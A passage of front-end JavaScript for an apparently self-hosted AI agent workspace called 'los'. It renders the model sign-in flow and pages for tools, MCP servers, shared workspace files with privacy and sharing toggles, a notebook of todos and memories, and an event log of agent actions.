      finished = true; clearInterval(poll);
      body.innerHTML = `<div class="empty"><div style="font-size:34px">✓</div><h3>Logged in</h3><p>${esc(b.label || b.name)} is ready.</p></div>`;
      onDone?.(); return;
    }
    if (l.state === "failed") {
      finished = true; clearInterval(poll);
      body.innerHTML = `<div class="msg-err">The login didn't finish.</div><pre class="log">${esc(l.output)}</pre><button class="btn" id="retry">Try again</button>`;
      $("#retry", body).onclick = () => { d.close(); loginFlow(b, onDone); };
      return;
    }
    if (!l.url) return;
    if (b.type === "codex") {
      body.innerHTML = `<ol class="steps-list">
        <li><b>Open the sign-in page</b> and log in with the ChatGPT account for this brain.<div><a class="btn primary" href="${esc(l.url)}" target="_blank" rel="noopener">Open sign-in page ↗</a></div></li>
        <li><b>Enter this code</b> when asked:<div class="device-code">${esc(l.code ?? "…")}</div></li>
        <li class="muted"><span class="spinner"></span> Waiting for you to approve. This page updates by itself.</li></ol>`;
      return;
    }
    if (codeSent) return;
    body.innerHTML = `<ol class="steps-list">
      <li><b>Open the sign-in page</b> and log in with the Claude account this brain should use.
        <div class="small muted">Already logged into the other account in this browser? Use a private window, or switch accounts on claude.ai first.</div>
        <div><a class="btn primary" href="${esc(l.url)}" target="_blank" rel="noopener">Open sign-in page ↗</a></div></li>
      <li><b>Paste the code</b> Claude shows after you approve:
        <form class="row" id="codef"><input class="input mono grow" name="code" placeholder="paste code here" required autocomplete="off"><button class="btn primary">Finish</button></form></li></ol>`;
    $("#codef", body).onsubmit = async (e) => {
      e.preventDefault();
      try {
        await api(`/api/brains/${encodeURIComponent(b.name)}/login/code`, { method: "POST", body: { code: e.target.code.value } });
        codeSent = true;
        body.innerHTML = `<div class="working"><span class="spinner"></span>Checking the code…</div>`;
      } catch (err) { fail(err); }
    };
  };
  try {
    render(await api(`/api/brains/${encodeURIComponent(b.name)}/login`, { method: "POST", body: {} }));
  } catch (e) { body.innerHTML = `<div class="msg-err">${esc(e.message)}</div>`; return; }
  poll = setInterval(async () => { try { render(await api(`/api/brains/${encodeURIComponent(b.name)}/login`)); } catch { /* keep polling */ } }, 2000);
}

// ── tools ────────────────────────────────────────────────────────────────
async function viewTools(root) {
  const data = await api("/api/tools");
  const state = { q: "", filter: "", open: new Set() };
  root.innerHTML = `<div class="page">
    <div class="page-head"><div><h1>Tools</h1><p>Everything agents can call: los plugins, plus tools from MCP servers. Agents start with a few and load more through <code>tool_search</code>. Local-only tools never reach a cloud brain.</p></div></div>
    <div class="row" style="margin-bottom:14px;flex-wrap:wrap">
      <div class="search grow" style="max-width:360px">${ICON.search}<input class="input" id="q" placeholder="Search tools"></div>
      <div class="tabs" id="tf">${[["", "All"], ["public", "Public"], ["local-only", "🔒 Local-only"], ["approval", "Needs approval"]].map(([k, l]) => `<button data-f="${k}" class="${k === "" ? "on" : ""}">${l}</button>`).join("")}</div>
    </div>
    <div id="groups"></div>
  </div>`;
  function draw() {
    const q = state.q.toLowerCase();
    const match = (t) => (!q || `${t.name} ${t.description} ${t.tags.join(" ")}`.toLowerCase().includes(q)) &&
      (!state.filter || (state.filter === "approval" ? t.sideEffect : t.privacy === state.filter));
    const html = data.plugins.map((p) => {
      const tools = data.tools.filter((t) => t.plugin === p.name && match(t));
      if (!tools.length) return "";
      return `<section class="plugin-group card">
        <div class="card-head"><h3>${esc(p.name)}</h3><span class="muted small grow">${esc(p.description)}</span>${p.name.startsWith("mcp_") ? `<span class="chip sea">MCP</span>` : ""}<span class="badge soft">${tools.length}</span></div>
        ${tools.map((t) => `<div class="tool-row" data-t="${esc(t.name)}">
          <div class="nm">${esc(t.name)}</div>
          <div class="small muted">${esc(t.description)}</div>
          <div class="chips">${t.privacy === "local-only" ? `<span class="chip warn">🔒 local</span>` : ""}${t.sideEffect ? `<span class="chip accent">approval</span>` : ""}</div>
          ${state.open.has(t.name) ? `<div class="tool-detail">${paramsHtml(t.parameters)}
            <div class="small"><span class="faint">Reachable by:</span> ${t.agents.length ? t.agents.map((a) => `<span class="chip">${esc(a)}</span>`).join(" ") : `<span class="faint">no agent</span>`}</div>
            ${t.tags.length ? `<div class="small"><span class="faint">Tags:</span> ${t.tags.map(esc).join(", ")}</div>` : ""}</div>` : ""}
        </div>`).join("")}
      </section>`;
    }).join("");
    $("#groups", root).innerHTML = html || `<div class="empty"><h3>No tools match</h3></div>`;
    $$(".tool-row", root).forEach((r) => (r.onclick = (e) => {
      if (e.target.closest(".tool-detail")) return;
      const n = r.dataset.t;
      state.open.has(n) ? state.open.delete(n) : state.open.add(n);
      draw();
    }));
  }
  $("#q", root).addEventListener("input", (e) => { state.q = e.target.value; draw(); });
  $$("#tf button", root).forEach((b) => (b.onclick = () => { state.filter = b.dataset.f; $$("#tf button", root).forEach((x) => x.classList.toggle("on", x === b)); draw(); }));
  draw();
}
function paramsHtml(schema) {
  const props = Object.entries(schema?.properties ?? {});
  if (!props.length) return `<div class="small faint">No parameters.</div>`;
  const req = new Set(schema.required ?? []);
  const type = (p) => p.enum ? p.enum.join(" | ") : p.type === "array" ? `${p.items?.type ?? "any"}[]` : p.type ?? (p.anyOf ? p.anyOf.map((x) => x.type).join(" | ") : "any");
  return `<div class="params">${props.map(([k, p]) => `<div class="param"><span class="pn">${esc(k)}${req.has(k) ? "" : `<span class="faint">?</span>`}</span><span class="pt">${esc(type(p))}</span><span class="muted">${esc(p.description ?? "")}</span></div>`).join("")}</div>`;
}

// ── MCP ──────────────────────────────────────────────────────────────────
async function viewMcp(root) {
  const draw = async () => {
    const data = await api("/api/mcp");
    root.innerHTML = `<div class="page">
      <div class="page-head"><div><h1>MCP servers</h1><p>External tool servers. los connects to each one, and its tools show up as <code>&lt;server&gt;_&lt;tool&gt;</code>. Runtime brains (Claude Code, Codex, opencode) reach them through los like every other tool, so approvals and privacy apply (local-only servers are never offered to a cloud brain).</p></div></div>
      <div class="stack">${data.servers.length ? data.servers.map((s) => `
        <section class="card server">
          <div class="server-head"><span class="nm">${esc(s.name)}</span><span class="chip outline">${esc(s.transport)}</span>
            ${s.privacy === "local-only" ? `<span class="chip warn">🔒 local-only</span>` : ""}
            ${s.status ? (s.status.ok ? `<span class="chip ok">connected · ${plural(s.status.tools, "tool")}</span>` : `<span class="chip err">failed</span>`) : `<span class="chip">not connected</span>`}</div>
          <div class="target">${esc(s.target)}</div>
          ${s.status?.error ? `<div class="msg-err">${esc(s.status.error)}</div>` : ""}
          ${s.envKeys.length ? `<div class="small muted">env: ${s.envKeys.map((k) => `<code>${esc(k)}</code>`).join(" ")}</div>` : ""}
          ${s.tools.length ? `<details><summary class="small muted" style="cursor:pointer">${plural(s.tools.length, "tool")}</summary><div class="chips" style="margin-top:8px">${s.tools.map((t) => `<span class="chip mono" title="${esc(t.description)}">${esc(t.name)}${t.sideEffect ? " ⚑" : ""}</span>`).join("")}</div></details>` : ""}
        </section>`).join("") : `<div class="card"><div class="empty"><h3>No MCP servers yet</h3><p>Add one in the config below: a stdio command or an HTTP URL.</p></div></div>`}
      </div>
      <h2 class="section">config/mcp.json</h2>
      <div class="card card-pad stack">
        <textarea class="input code-edit" id="raw" spellcheck="false">${esc(data.raw)}</textarea>
        <div class="row"><span class="small faint grow">Saving reconnects every server. Unannotated MCP tools need approval (⚑).</span>
          ${data.example ? `<button class="btn ghost" id="ex">Show example</button>` : ""}<button class="btn primary" id="save">Save &amp; reconnect</button></div>
        <pre class="log" id="example" hidden>${esc(data.example ?? "")}</pre>
      </div>
    </div>`;
    codeEditor($("#raw", root));
    const ex = $("#ex", root);
    if (ex) ex.onclick = () => { $("#example", root).hidden = !$("#example", root).hidden; };
    $("#save", root).onclick = async (e) => {
      e.target.disabled = true;
      try { await api("/api/mcp", { method: "PUT", body: { raw: $("#raw", root).value } }); toast("Saved and reconnected"); await draw(); }
      catch (err) { fail(err); e.target.disabled = false; }
    };
  };
  await draw();
}

// ── files ────────────────────────────────────────────────────────────────
async function viewFiles(root) {
  const state = { dir: decodeURIComponent(location.hash.slice(1)) || "", q: "", data: null };
  const enc = (p) => p.split("/").map(encodeURIComponent).join("/");
  const fileUrl = (p) => `/files/${enc(p)}`;
  const abs = (u) => new URL(u, location.origin).href; // share links are relative when there's no files address
  const ext = (n) => (n.includes(".") ? n.split(".").pop() : "").toLowerCase().slice(0, 4);
  const isImg = (n) => /\.(png|jpe?g|gif|webp|avif|svg)$/i.test(n);
  root.innerHTML = `<div class="page">
    <div class="page-head"><div><h1>Workspace</h1><p>One shared folder for you and the team. Agents read and write here, everything readable is indexed for search, and any file can be shown in a chat. Private files and folders are only for teammates allowed to read private data.</p></div>
      <div class="actions"><button class="btn" id="ingest">${ICON.refresh}Index now</button><button class="btn" id="mkdir">${ICON.plus}New folder</button><label class="btn primary">${ICON.upload}Upload<input type="file" multiple hidden id="up"></label></div></div>
    <div class="ws-bar"><nav class="crumbs" id="crumbs"></nav><span class="grow"></span>
      <label class="check small" title="Uploads become private: only teammates allowed to read private data can open them"><input type="checkbox" id="up-private">🔒 upload as private</label>
      <div class="search" style="width:280px">${ICON.search}<input class="input" id="q" placeholder="Search names and contents"></div></div>
    <div id="ingest-log-wrap" hidden><div class="log" id="ingest-log"></div></div>
    <section class="card ws" id="drop"><div id="list"></div><div class="ws-drop-hint">Drop files here to upload them to this folder</div></section>
  </div>`;
  const list = $("#list", root), drop = $("#drop", root);

  async function load() {
    try { state.data = await api(`/api/workspace?dir=${encodeURIComponent(state.dir)}`); }
    catch (e) { fail(e); state.dir = ""; return load(); }
    if (location.hash.slice(1) !== enc(state.dir)) history.replaceState(null, "", `/files${state.dir ? `#${enc(state.dir)}` : ""}`);
    const parts = state.dir ? state.dir.split("/") : [];
    $("#crumbs", root).innerHTML = `<a href="#" data-dir="">workspace</a>${parts.map((p, i) => `<span>/</span><a href="#" data-dir="${esc(parts.slice(0, i + 1).join("/"))}">${esc(p)}</a>`).join("")}${state.data.private ? ` <span class="chip warn" style="padding:0 7px">🔒 private</span>` : ""}`;
    $$("[data-dir]", $("#crumbs", root)).forEach((a) => (a.onclick = (e) => { e.preventDefault(); state.dir = a.dataset.dir; load(); }));
    setIngest(state.data.ingest);
    if (state.q) return search();
    const e = state.data.entries;
    list.innerHTML = e.length ? e.map(row).join("") : `<div class="empty"><h3>${state.dir ? "This folder is empty" : "The workspace is empty"}</h3><p>Upload files, make a folder, or ask a teammate to make something here.</p></div>`;
    wire();
  }
  const row = (x) => `<div class="ws-row ${x.private ? "is-private" : ""}" data-path="${esc(x.path)}" data-dir="${x.dir ? 1 : 0}">
      ${x.dir ? `<span class="file-ic dir">${ICON.folder ?? "📁"}</span>` : isImg(x.name) ? `<img class="ws-thumb" src="${fileUrl(x.path)}" loading="lazy" alt="">` : `<span class="file-ic ${esc(ext(x.name))}">${esc(ext(x.name) || "file")}</span>`}
      <div class="grow" style="min-width:0"><div class="ws-name ellipsis">${esc(x.name)}${x.dir ? "/" : ""}</div>
        <div class="sub">${x.dir ? plural(x.children, "item") : bytes(x.size)} · ${ago(x.modified)}${x.indexed ? ` · <span style="color:var(--ok)">indexed</span>` : ""}</div></div>
      ${x.private ? "" : `<button type="button" class="pub ${x.shared ? "on" : ""}" data-pub="${esc(x.path)}" data-on="${x.shared?.own ? 1 : 0}" ${x.shared && !x.shared.own ? "disabled" : ""}
        title="${x.shared ? (x.shared.own ? `Shared: anyone with the share link can open it. Click to stop sharing.\n${esc(abs(x.shared.url))}` : "Shared because a folder above it is shared") : "Only you. Click to share it: a link anyone can open"}">🌐${x.shared ? `<span>${x.shared.own ? "shared" : "via folder"}</span>` : ""}</button>`}
      ${privToggle(`data-priv="${esc(x.path)}" data-on="${x.private ? 1 : 0}"`, x.private)}
      <button class="icon-btn" data-act="${esc(x.path)}" title="More">⋯</button></div>`;
  function wire() {
    $$(".ws-row", list).forEach((r) => (r.onclick = (e) => {
      if (e.target.closest("[data-priv],[data-act],[data-pub]")) return;
      if (r.dataset.dir === "1") { state.dir = r.dataset.path; state.q = ""; $("#q", root).value = ""; load(); }
      else preview(r.dataset.path);
    }));
    $$("[data-priv]", list).forEach((b) => (b.onclick = async () => {
      try { await api(`/api/workspace?path=${encodeURIComponent(b.dataset.priv)}`, { method: "PATCH", body: { private: b.dataset.on !== "1" } }); load(); } catch (e) { fail(e); }
    }));
    $$("[data-pub]", list).forEach((b) => (b.onclick = async () => {
      const on = b.dataset.on !== "1", p = b.dataset.pub;
      if (on && !confirm(`Share "${p}"? Anyone with its share link can open it${b.closest(".ws-row").dataset.dir === "1" ? " (and everything in the folder)" : ""}, without logging in.`)) return;
      try {
        const r = await api(`/api/workspace?path=${encodeURIComponent(p)}`, { method: "PATCH", body: { shared: on } });
        if (r.url) { await navigator.clipboard.writeText(abs(r.url)).catch(() => {}); toast("Shared. Share link copied"); } else toast("Not shared any more: the share link no longer works");
        load();
      } catch (e) { fail(e); }
    }));
    $$("[data-act]", list).forEach((b) => (b.onclick = () => {
      const p = b.dataset.act, isDir = b.closest(".ws-row").dataset.dir === "1";
      const pubUrl = state.data.entries.find((x) => x.path === p)?.shared?.url;
      popMenu(b, `${isDir ? "" : `<button type="button" class="pm-item" data-pick="open"><span class="pm-txt"><span class="pm-t">Open in a new tab</span></span></button>
        <button type="button" class="pm-item" data-pick="link"><span class="pm-txt"><span class="pm-t">Copy chat link</span><span class="pm-s">Markdown to paste in a room</span></span></button>
        <button type="button" class="pm-item" data-pick="download"><span class="pm-txt"><span class="pm-t">Download</span></span></button>`}
        ${pubUrl ? `<button type="button" class="pm-item" data-pick="public"><span class="pm-txt"><span class="pm-t">Copy share link</span><span class="pm-s">Works for anyone, no login</span></span></button>` : ""}
        <button type="button" class="pm-item" data-pick="rename"><span class="pm-txt"><span class="pm-t">Rename or move</span></span></button>
        <button type="button" class="pm-item" data-pick="delete"><span class="pm-txt"><span class="pm-t" style="color:var(--err)">Delete${isDir ? " folder" : ""}</span></span></button>`, {
        align: "down",
        onPick: async (what) => {
          const name = p.split("/").pop();
          try {
            if (what === "open") window.open(fileUrl(p), "_blank", "noopener");
            if (what === "public") { await navigator.clipboard.writeText(abs(pubUrl)); toast("Share link copied"); }
            if (what === "download") location.href = `${fileUrl(p)}?download=1`;
            if (what === "link") { await navigator.clipboard.writeText(isImg(name) ? `![${name}](${fileUrl(p)})` : `[${name}](${fileUrl(p)})`); toast("Link copied"); }
            if (what === "rename") { const to = prompt("New path (inside the workspace)", p); if (to && to !== p) { await api(`/api/workspace?path=${encodeURIComponent(p)}`, { method: "PATCH", body: { to } }); load(); } }
            if (what === "delete" && confirm(`Delete ${p}${isDir ? " and everything in it" : ""}?`)) { await api(`/api/workspace?path=${encodeURIComponent(p)}`, { method: "DELETE" }); load(); }
          } catch (e) { fail(e); }
        },
      });
    }));
  }
  async function search() {
    const q = state.q;
    const [hit, docs] = await Promise.all([api(`/api/workspace/search?q=${encodeURIComponent(q)}`), api(`/api/documents?q=${encodeURIComponent(q)}`).catch(() => ({ hits: [] }))]);
    if (q !== state.q) return;
    const byFile = {};
    for (const c of hit.content) (byFile[c.path] ??= []).push(c);
    list.innerHTML = `
      ${hit.names.length ? `<div class="ws-sec">Names</div>${hit.names.map((n) => `<div class="ws-row" data-path="${esc(n.path)}" data-dir="0"><span class="file-ic ${esc(ext(n.path))}">${esc(ext(n.path) || "file")}</span><div class="grow ws-name ellipsis">${esc(n.path)}</div>${n.private ? "🔒" : ""}</div>`).join("")}` : ""}
      ${Object.keys(byFile).length ? `<div class="ws-sec">Inside files</div>${Object.entries(byFile).map(([p, hs]) => `<div class="ws-row" data-path="${esc(p)}" data-dir="0"><span class="file-ic ${esc(ext(p))}">${esc(ext(p) || "file")}</span><div class="grow" style="min-width:0"><div class="ws-name ellipsis">${esc(p)}${hs[0].private ? " 🔒" : ""}</div>${hs.map((h) => `<div class="small mono muted ellipsis">${h.line}: ${esc(h.text)}</div>`).join("")}</div></div>`).join("")}` : ""}
      ${docs.hits?.length ? `<div class="ws-sec">In the index (PDFs, mail)</div>${docs.hits.map((x) => `<div class="ws-row" data-doc="${x.docId}"><span class="file-ic">${esc((x.source.split(":")[0] || "doc").slice(0, 4))}</span><div class="grow" style="min-width:0"><div class="ws-name ellipsis">${x.private ? "🔒 " : ""}${esc(x.title)}</div><div class="small muted ellipsis2">${esc(x.snippet)}</div></div></div>`).join("")}` : ""}
      ${!hit.names.length && !Object.keys(byFile).length && !docs.hits?.length ? `<div class="empty small">Nothing matches “${esc(q)}”.</div>` : ""}`;
    $$(".ws-row[data-path]", list).forEach((r) => (r.onclick = () => preview(r.dataset.path)));
    $$(".ws-row[data-doc]", list).forEach((r) => (r.onclick = () => showDoc(Number(r.dataset.doc))));
  }
  async function preview(p) {
    const name = p.split("/").pop(), url = fileUrl(p);
    const kind = isImg(name) ? "img" : /\.pdf$/i.test(name) ? "pdf" : /\.html?$/i.test(name) ? "html" : /\.(mp4|webm)$/i.test(name) ? "video" : /\.(mp3|wav|ogg)$/i.test(name) ? "audio" : "text";
    const d = openDrawer(`${drawerHead(esc(name), esc(p))}
      <div class="drawer-body ws-preview">${kind === "img" ? `<img src="${url}" alt="">` : kind === "pdf" || kind === "html" ? `<iframe src="${url}" title="${esc(name)}"></iframe>` : kind === "video" ? `<video src="${url}" controls></video>` : kind === "audio" ? `<audio src="${url}" controls></audio>` : `<div class="working"><span class="spinner"></span>Loading…</div>`}</div>
      <div class="drawer-foot"><button class="btn ghost" id="pv-link">${ICON.copy}Copy chat link</button><span class="grow"></span><a class="btn" href="${url}?download=1">${ICON.download}Download</a><a class="btn primary" href="${url}" target="_blank" rel="noopener">Open</a></div>`, { wide: true });
    $("#pv-link", d.el).onclick = () => navigator.clipboard.writeText(isImg(name) ? `![${name}](${url})` : `[${name}](${url})`).then(() => toast("Link copied"));
    if (kind !== "text") return;
    try {
      const r = await fetch(url);
      const txt = (await r.text()).slice(0, 400_000);
      const body = $(".ws-preview", d.el);
      if (/\.md$/i.test(name)) body.innerHTML = `<div class="md">${md(txt)}</div>`;
      else body.innerHTML = `<pre><code class="language-${esc(ext(name))}">${esc(txt)}</code></pre>`;
      enhance(body);
    } catch (e) { fail(e); }
  }
  async function showDoc(id) {
    try {
      const x = await api(`/api/documents/${id}`);
      openDrawer(`${drawerHead(esc(x.title), `${esc(x.source)}${x.date ? ` · ${esc(x.date)}` : ""}`)}<div class="drawer-body">${x.summary ? `<div class="notice info"><span>✦</span><div>${esc(x.summary)}</div></div>` : ""}<div class="doc-content">${esc(x.content)}</div></div>`);
    } catch (e) { fail(e); }
  }
  async function upload(files) {
    for (const file of files) {
      const path = (state.dir ? state.dir + "/" : "") + file.name;
      try { await api(`/api/workspace/file?path=${encodeURIComponent(path)}&private=${$("#up-private", root).checked ? 1 : 0}`, { method: "PUT", raw: file, headers: { "content-type": "application/octet-stream" } }); toast(`Uploaded ${file.name}`); }
      catch (e) { fail(e); }
    }
    load();
  }
  function setIngest(ing) {
    if (!ing) return;
    $("#ingest", root).disabled = ing.running;
    $("#ingest", root).innerHTML = ing.running ? `<span class="spinner"></span>Indexing…` : `${ICON.refresh}Index now`;
    if (ing.log?.length) { $("#ingest-log-wrap", root).hidden = false; $("#ingest-log", root).textContent = ing.log.join("\n"); }
  }
  $("#up", root).onchange = (e) => upload([...e.target.files]);
  drop.addEventListener("dragover", (e) => { e.preventDefault(); drop.classList.add("over"); });
  drop.addEventListener("dragleave", (e) => { if (!drop.contains(e.relatedTarget)) drop.classList.remove("over"); });
  drop.addEventListener("drop", (e) => { e.preventDefault(); drop.classList.remove("over"); upload([...e.dataTransfer.files]); });
  $("#mkdir", root).onclick = async () => {
    const name = prompt("Folder name");
    if (!name) return;
    try { await api("/api/workspace/folder", { method: "POST", body: { path: (state.dir ? state.dir + "/" : "") + name } }); load(); } catch (e) { fail(e); }
  };
  $("#q", root).addEventListener("input", debounce((e) => { state.q = e.target.value.trim(); state.q ? search() : load(); }, 280));
  $("#ingest", root).onclick = async () => {
    try { await api("/api/ingest", { method: "POST", body: {} }); $("#ingest-log", root).textContent = ""; setIngest({ running: true }); } catch (e) { fail(e); }
  };
  await load();
  const reload = debounce(() => !state.q && load(), 400);
  return {
    onUi: (e) => {
      if (e.kind === "workspace") reload();
      if (e.kind !== "ingest") return;
      if (e.line) { $("#ingest-log-wrap", root).hidden = false; const l = $("#ingest-log", root); l.textContent += (l.textContent ? "\n" : "") + e.line; l.scrollTop = l.scrollHeight; }
      if (e.running === false) { setIngest({ running: false }); load(); }
    },
    onAgent: (e) => e.event.type === "tool_result" && /^(files_|shell_)/.test(e.event.name || "") && reload(),
  };
}

// The private switch, used for memories, files and folders. It's about AI, not the web: private = only local models
// (or teammates granted access) may read it. (Sharing on the web is the separate 🌐 switch on workspace files.)
const privToggle = (attrs, isPrivate) => `<button type="button" class="priv ${isPrivate ? "on" : ""}" ${attrs}
  title="${isPrivate ? "Private: only local AI models (or teammates you granted access) may read this, and it can't be shared. Click to let every teammate read it." : "Every teammate may read this. Click to make it private: local AI models only."}">${isPrivate ? "🔒 Private" : "🔒"}</button>`;

// ── notebook ─────────────────────────────────────────────────────────────
async function viewNotebook(root) {
  async function draw() {
    const n = await api("/api/notes");
    const open = n.todos.filter((t) => !t.done).length;
    root.innerHTML = `<div class="page">
      <div class="page-head"><div><h1>Notebook</h1><p>What agents keep for you: todos, long-term memories, and mail drafts waiting for you to send.</p></div></div>
      <div class="grid grid-2">
        <section class="card"><div class="card-head"><h3>Todos</h3><span class="badge soft">${open}</span></div>
          <form class="inline-form" id="todo-form"><input class="input grow" name="text" placeholder="Add a todo…" required><input class="input" type="date" name="due" style="width:150px"><button class="btn">${ICON.plus}</button></form>
          <div>${n.todos.length ? n.todos.map((t) => `<div class="todo ${t.done ? "done" : ""}"><input type="checkbox" data-todo="${t.id}" ${t.done ? "checked" : ""}>
            <span class="txt grow">${esc(t.text)}</span>${t.due ? `<span class="chip ${!t.done && t.due < new Date().toISOString().slice(0, 10) ? "err" : "outline"}">${esc(t.due)}</span>` : ""}
            <button class="icon-btn del" data-deltodo="${t.id}" title="Delete">${ICON.trash}</button></div>`).join("") : `<div class="empty small">No todos.</div>`}</div></section>
        <section class="card"><div class="card-head"><h3>Memories</h3><span class="badge soft">${n.memories.length}</span>
          <span class="small faint" style="margin-left:auto">${n.memories.filter((m) => m.private).length} private</span></div>
          <p class="small muted" style="margin:0;padding:10px 16px 0">Public memories go into every conversation, so the assistant knows you. Private ones are never shown to cloud brains; only local brains can search them.</p>
          <form class="inline-form" id="mem-form"><input class="input grow" name="text" placeholder="Something los should remember…" required><input class="input" name="tags" placeholder="tags" style="width:110px">
            <label class="check small" title="Never shown to cloud brains"><input type="checkbox" name="private" ${n.memoryDefault === "private" ? "checked" : ""}>🔒</label><button class="btn">${ICON.plus}</button></form>
          <div>${n.memories.length ? n.memories.map((m) => `<div class="memory ${m.private ? "is-private" : ""}"><div class="grow"><div>${esc(m.text)}</div><div class="small faint">${m.tags ? esc(m.tags) + " · " : ""}${ago(m.created_at)}</div></div>
            ${privToggle(`data-privmem="${m.id}" data-on="${m.private ? 1 : 0}"`, m.private)}
            <button class="icon-btn del" data-delmem="${m.id}" title="Forget">${ICON.trash}</button></div>`).join("") : `<div class="empty small">No memories yet. The assistant saves them as it learns about you, or add one here.</div>`}</div></section>
      </div>
      <h2 class="section">Mail drafts <span class="count">${n.drafts.length}</span></h2>
      <div class="stack">${n.drafts.length ? n.drafts.map((d) => `<section class="card card-pad stack">
          <div class="row"><div class="grow"><div style="font-weight:600">${esc(d.subject)}</div><div class="small muted">to ${esc(d.to_addr)} · ${ago(d.created_at)}</div></div>
            <button class="btn sm" data-copy="${d.id}">Copy</button><button class="icon-btn" data-deldraft="${d.id}">${ICON.trash}</button></div>
          <div class="doc-content" style="max-height:240px">${esc(d.body)}</div></section>`).join("") : `<div class="card"><div class="empty small">No drafts. Vera writes them here; los never sends mail itself.</div></div>`}</div>
    </div>`;
    const act = async (fn) => { try { await fn(); draw(); } catch (e) { fail(e); } };
    $("#todo-form", root).onsubmit = (e) => { e.preventDefault(); const f = new FormData(e.target); act(() => api("/api/todos", { method: "POST", body: { text: f.get("text"), due: f.get("due") } })); };
    $("#mem-form", root).onsubmit = (e) => { e.preventDefault(); const f = new FormData(e.target); act(() => api("/api/memories", { method: "POST", body: { text: f.get("text"), tags: f.get("tags"), private: f.get("private") === "on" } })); };
    $$("[data-privmem]", root).forEach((b) => (b.onclick = () => act(() => api(`/api/memories/${b.dataset.privmem}`, { method: "PATCH", body: { private: b.dataset.on !== "1" } }))));
    $$("[data-todo]", root).forEach((c) => (c.onchange = () => act(() => api(`/api/todos/${c.dataset.todo}`, { method: "PATCH", body: { done: c.checked } }))));
    $$("[data-deltodo]", root).forEach((b) => (b.onclick = () => act(() => api(`/api/todos/${b.dataset.deltodo}`, { method: "DELETE" }))));
    $$("[data-delmem]", root).forEach((b) => (b.onclick = () => confirm("Forget this memory?") && act(() => api(`/api/memories/${b.dataset.delmem}`, { method: "DELETE" }))));
    $$("[data-deldraft]", root).forEach((b) => (b.onclick = () => confirm("Delete this draft?") && act(() => api(`/api/drafts/${b.dataset.deldraft}`, { method: "DELETE" }))));
    $$("[data-copy]", root).forEach((b) => (b.onclick = () => { const d = n.drafts.find((x) => x.id == b.dataset.copy); navigator.clipboard.writeText(`To: ${d.to_addr}\nSubject: ${d.subject}\n\n${d.body}`).then(() => toast("Copied")); }));
  }
  await draw();
  const reload = debounce(draw, 800);
  return { onAgent: (e) => e.event.type === "tool_result" && /todos|memory|mail/.test(e.event.name || "") && reload() };
}

// ── events ───────────────────────────────────────────────────────────────
async function viewEvents(root) {
  const state = { type: "", rows: [], live: true, open: new Map() }; // open: event id → { pretty, full }
  const prettyDefault = () => { try { return localStorage.getItem("los.events.pretty") !== "0"; } catch { return true; } };
  root.innerHTML = `<div class="page">
    <div class="page-head"><div><h1>Events</h1><p>The append-only log of everything agents do. A tool call carries its result: open it to see both in full.</p></div>
      <div class="actions"><label class="row small muted"><input type="checkbox" id="live" checked> live</label></div></div>
    <div class="tabs" id="et" style="margin-bottom:12px">${[["", "all"], ["tool_call", "tool calls"], ["text", "text"], ["approval", "approvals"], ["error", "errors"], ["runtime", "runtime"], ["usage", "usage"]].map(([t, l]) => `<button data-t="${t}" class="${t ? "" : "on"}">${l}</button>`).join("")}</div>
    <div class="card"><div class="table-wrap"><table class="table ev-table"><thead><tr><th>When</th><th>Type</th><th>Where</th><th>What</th><th></th></tr></thead><tbody id="ev"></tbody></table></div></div>
    <div style="text-align:center;margin-top:14px"><button class="btn" id="more">Load older</button></div>
  </div>`;
  const tbody = $("#ev", root);
  const status = (e) => e.data.type !== "tool_call" ? ""
    : !e.result ? `<span class="ev-st pending" title="no result yet"></span>`
    : `<span class="ev-st ${e.result.ok ? "ok" : "bad"}" title="${e.result.ok ? "ok" : "failed"}"></span><span class="small faint nowrap" title="the log keeps whole seconds">${e.result.ms >= 1000 ? fmtMs(e.result.ms) : e.result.ms >= 0 ? "<1s" : ""}</span>`;
  const row = (e, isNew = false) => {
    const d = e.data, open = state.open.get(e.id);
    const where = e.task_id ? `<a href="/tasks/${e.task_id}">task #${e.task_id}</a>` : e.session_id ? `<a href="/chat/${e.session_id}">${esc(e.session_title || "chat")}</a>` : "";
    return `<tr class="ev-row ${isNew ? "ev-new" : ""} ${open ? "is-open" : ""}" data-id="${e.id}" ${d.type === "tool_call" ? `data-call="${esc(d.call.id)}"` : ""}>
      <td class="nowrap small muted" title="${esc(e.created_at ?? "")}">${e.created_at ? ago(e.created_at) : "now"}</td>
      <td><span class="ev-type chip ${d.type === "error" ? "err" : d.type === "approval" ? "accent" : "outline"}">${esc(d.type === "tool_call" ? "tool" : d.type)}</span></td>
      <td class="small" style="max-width:200px"><div class="ellipsis">${e.agent ? `<b>${esc(agentName(e.agent))}</b> · ` : ""}${where}</div></td>
      <td class="ev-data">${d.type === "tool_call" ? `<b>${esc(prettyTool(d.call.name))}</b> <span class="muted">${esc(argsSummary(d.call))}</span>${e.result?.preview ? `<div class="small faint ellipsis">→ ${esc(e.result.preview.replace(/\s+/g, " "))}</div>` : ""}` : esc(eventSummary(d))}</td>
      <td class="ev-ctl nowrap">${status(e)}
        ${open ? `<button type="button" class="ev-pretty ${open.pretty ? "on" : ""}" data-pretty title="Prettify: easier to read (off = exactly as sent)">{ }</button>` : ""}
        <button type="button" class="ev-chev" data-toggle aria-expanded="${open ? "true" : "false"}" title="${open ? "Close" : "Show it all"}"><svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button></td></tr>
      ${open ? `<tr class="ev-detail" data-detail="${e.id}"><td colspan="5">${detailHtml(e, open)}</td></tr>` : ""}`;
  };
  // Readable: arguments as fields, multi-line text as text, JSON indented. Raw: exactly the strings that were sent.
  const block = (label, body) => `<div class="insp-h">${label}</div>${body}`;
  const pre = (x) => `<pre class="insp-pre">${esc(x)}</pre>`;
  const prettyValue = (v) => typeof v === "string" ? (v.includes("\n") || v.length > 100 ? pre(v) : `<code class="ev-val">${esc(v)}</code>`)
    : v && typeof v === "object" ? pre(JSON.stringify(v, null, 2)) : `<code class="ev-val">${esc(JSON.stringify(v))}</code>`;
  const prettyText = (t) => { try { const j = JSON.parse(t); if (j && typeof j === "object") return pre(JSON.stringify(j, null, 2)); } catch { /* not JSON */ } return pre(t); };
  function detailHtml(e, open) {
    const d = e.data;
    if (d.type !== "tool_call") return open.pretty ? pre(JSON.stringify(d, null, 2)) : pre(JSON.stringify(d));
    if (!open.full) return `<div class="working small"><span class="spinner" style="width:12px;height:12px"></span>Loading…</div>`;
    const f = open.full, args = f.call?.args ?? {};
    const argsHtml = open.pretty
